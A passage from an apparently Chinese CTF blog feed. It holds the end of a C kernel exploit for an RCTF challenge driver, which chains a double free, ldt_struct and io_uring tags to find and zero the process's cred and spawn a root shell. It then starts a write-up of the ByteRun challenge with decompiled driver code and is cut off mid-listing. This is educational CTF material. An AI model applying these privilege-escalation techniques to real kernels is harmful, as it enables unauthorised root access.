class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> search_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> *result;</span><br><span class="line">    <span class="keyword">uint64_t</span> cred = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/game&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed open /dev/game&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] construct double free! \033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    init_uring();</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, buf);</span><br><span class="line">    ioctl(fd, <span class="number">0x72</span>, <span class="string">&quot;flag=aaaaaaaaa&quot;</span>); <span class="comment">// context-&gt;cur[0] = object(0x10);</span></span><br><span class="line">    read(fd, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr = *(<span class="keyword">uint64_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] heap_addr : \033[0m %p\n&quot;</span>, heap_addr);</span><br><span class="line">    ioctl(fd, <span class="number">1</span>, buf);                 <span class="comment">// context-&gt;prv[0] = object(0x10);</span></span><br><span class="line">    ioctl(fd, <span class="number">0x72</span>, <span class="string">&quot;flag=bbbbbbbbb&quot;</span>); <span class="comment">// kfree(context-&gt;cur[0]);</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc)); <span class="comment">// context-&gt;prev[0] = object(0x10) == ldt_struct;</span></span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x16</span>, buf); <span class="comment">// double free     kfree(object(ldt_struct));</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] search cred!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    register_tag(&amp;ring, buf, <span class="number">2</span>);</span><br><span class="line">    search_addr = heap_addr &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">        ldt.entries = search_addr - i * <span class="number">0x1000</span>;</span><br><span class="line">        ldt.nr_entries = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">        update_tag(&amp;ring, &amp;ldt, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; i % <span class="number">0x200</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] looked up range from \033[0m %p ~ %p\n&quot;</span>, search_addr - i * <span class="number">0x1000</span>, search_addr + i * <span class="number">0x1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;read_ldt failed!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            result = memmem(buf, <span class="number">0x1000</span>, target, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> (result)</span><br><span class="line">            &#123;</span><br><span class="line">                cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">                real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x18</span>);</span><br><span class="line">                <span class="keyword">if</span> ((real_cred &amp; <span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">                &#123;</span><br><span class="line">                    target_addr = search_addr - (i * <span class="number">0x1000</span>) + (result - buf);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found task_struct : \033[0m %p\n&quot;</span>, target_addr);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found cred : \033[0m %p\n&quot;</span>, real_cred);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    real_cred = <span class="number">-1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[-]\033[0m cannot rehint cred\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (real_cred != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">        ldt.entries = search_addr + i * <span class="number">0x1000</span>;</span><br><span class="line">        ldt.nr_entries = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">        update_tag(&amp;ring, &amp;ldt, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;read_ldt failed!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            result = memmem(buf, <span class="number">0x1000</span>, target, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> (result)</span><br><span class="line">            &#123;</span><br><span class="line">                cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">                real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x18</span>);</span><br><span class="line">                <span class="keyword">if</span> ((real_cred &amp; <span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">                &#123;</span><br><span class="line">                    target_addr = search_addr + (i * <span class="number">0x1000</span>) + (result - buf);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found task_struct : \033[0m %p\n&quot;</span>, target_addr);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found cred : \033[0m %p\n&quot;</span>, real_cred);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    real_cred = <span class="number">-1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[-]\033[0m cannot rehint cred\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (real_cred != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] write cred!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff1000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">4</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    register_tag(&amp;ring1, buf, (<span class="number">0x1000</span> / <span class="number">8</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = real_cred + <span class="number">4</span> + <span class="number">8</span> * i;</span><br><span class="line">        update_tag(&amp;ring, buf, <span class="number">1</span>);</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = <span class="number">0</span>;</span><br><span class="line">        read(fd, info, <span class="number">9</span>);</span><br><span class="line">        update_tag(&amp;ring1, buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = search_addr + <span class="number">0x3000000</span>;</span><br><span class="line">    update_tag(&amp;ring, buf, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] write Done \033[0m&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230420164729825.png"                      alt="image-20230420164729825"                ></p><hr><p>参考链接:</p><p>​    <a class="link"   href="https://blog.rois.io/2022/rctf-2022-official-write-up/" >https://blog.rois.io/2022/rctf-2022-official-write-up/<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://elixir.bootlin.com/linux/v6.0.12/source" >https://elixir.bootlin.com/linux/v6.0.12/source<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896" >https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896<i class="fas fa-external-link-alt"></i></a></p><p>题目链接:</p><p>​    XCTF中可以下载</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;目前各种比赛的各种赛制真的是让人十分难受，以至于感觉自己不怎么适合打比赛了。所以打算静下心来复现一场比赛，在RCTF中找到分值最低的一道题。</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="io_uring" scheme="https://cv196082.gitee.io/tags/io-uring/"/>
    
    <category term="modify_ldt" scheme="https://cv196082.gitee.io/tags/modify-ldt/"/>
    
  </entry>
  
  <entry>
    <title>ByteRun复现</title>
    <link href="https://cv196082.gitee.io/2023/04/01/ByteRun%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2023/04/01/ByteRun%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-04-01T07:05:48.000Z</published>
    <updated>2023-04-01T07:05:25.085Z</updated>
    
    <content type="html"><![CDATA[<p>当初看到墨晚鸢大佬的博客对这道题目的描述的时候就对这道题暗生情愫了，如今终于是得以复现。</p><h2 id="内核分析"><a href="#内核分析" class="headerlink" title="内核分析"></a>内核分析</h2><h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p><del>这道题目要说难也算难，要说简单那就是说屁话</del>。这道题可以说是从逆向就开始变得不对劲起来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">bytedev_read</span><span class="params">(__int64 a1, __int64 user_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 a3; <span class="comment">// r14</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v6; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r13</span></span><br><span class="line">  __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  __int64 offset; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 *v10; <span class="comment">// r8</span></span><br><span class="line">  __int64 read_size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 remaining_size; <span class="comment">// rbx</span></span><br><span class="line">  __int64 read_chunk_pos; <span class="comment">// r15</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v17; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v19; <span class="comment">// eax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rbx</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, user_buf);</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v5 = v4 + <span class="number">40</span>;</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">40</span>);</span><br><span class="line">  v6 = __indword(*(_QWORD *)(v4 + <span class="number">0x20</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    idx = *(<span class="keyword">int</span> *)(v7 + <span class="number">0xB0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)idx != *(_DWORD *)(v7 + <span class="number">0xB4</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      offset = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = *(<span class="keyword">unsigned</span> __int16 **)(v7 + <span class="number">8</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">          read_size = v10[<span class="number">1</span>];</span><br><span class="line">          remaining_size = *v10 - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read_size;</span><br><span class="line">          read_chunk_pos = (__int64)v10 + read_size + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( remaining_size &gt; a3 )</span><br><span class="line">            remaining_size = a3;                <span class="comment">// current_read_size</span></span><br><span class="line">          <span class="keyword">if</span> ( (remaining_size &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          chunk = *(_WORD **)(v7 + <span class="number">8</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">          _check_object_size((<span class="keyword">char</span> *)v10 + read_size + <span class="number">4</span>, remaining_size, <span class="number">1LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( copy_to_user(offset + user_buf, read_chunk_pos, remaining_size) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          a3 -= remaining_size;</span><br><span class="line">          offset += remaining_size;</span><br><span class="line">          v14 = (<span class="keyword">unsigned</span> __int16)(remaining_size + chunk[<span class="number">1</span>]);</span><br><span class="line">          chunk[<span class="number">1</span>] += remaining_size;</span><br><span class="line">          <span class="keyword">if</span> ( (_WORD)v14 == *chunk )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (_WORD)v14 != <span class="number">0xFFC</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            kfree(chunk);</span><br><span class="line">            *(_DWORD *)(v7 + <span class="number">0xB0</span>) = (*(_DWORD *)(v7 + <span class="number">0xB0</span>) + <span class="number">1</span>) % <span class="number">0x10</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( a3 )</span><br><span class="line">          &#123;</span><br><span class="line">            idx = *(<span class="keyword">int</span> *)(v7 + <span class="number">0xB0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (_DWORD)idx != *(_DWORD *)(v7 + <span class="number">0xB4</span>) )</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(&amp;unk_F90);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_1038);</span><br><span class="line">LABEL_21:</span><br><span class="line">    raw_spin_unlock(v5);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v16 = <span class="number">0x200</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x200</span> )</span><br><span class="line">    v16 = a3;</span><br><span class="line">  v17 = *(_QWORD *)(v15 + <span class="number">0x20</span>);</span><br><span class="line">  v18 = __indword(v17);</span><br><span class="line">  <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = __indword(v17 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v19 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = *(_QWORD *)(v15 + <span class="number">0x18</span>);</span><br><span class="line">      _check_object_size(v20, v16, <span class="number">1LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( copy_to_user(user_buf, v20, v16) )</span><br><span class="line">        printk(&amp;unk_1010);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_FF0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  bytedev_read_cold_14();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在驱动的这个read函数中被分为了两块，在下半部分可以看到一直使用的是<code>__indword</code>函数，而这个是对于设备的IO操作，所以下半部分就是对于设备的控制，上半部分则是对于内核中自身的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_write</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 a3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v5; <span class="comment">// eax</span></span><br><span class="line">  __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// r9d</span></span><br><span class="line">  <span class="keyword">int</span> read_idx; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  __int64 v10; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// edx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 remaining_size; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// r13</span></span><br><span class="line">  __int64 user_buf; <span class="comment">// r12</span></span><br><span class="line">  __int64 write_offset; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// r13</span></span><br><span class="line">  _DWORD 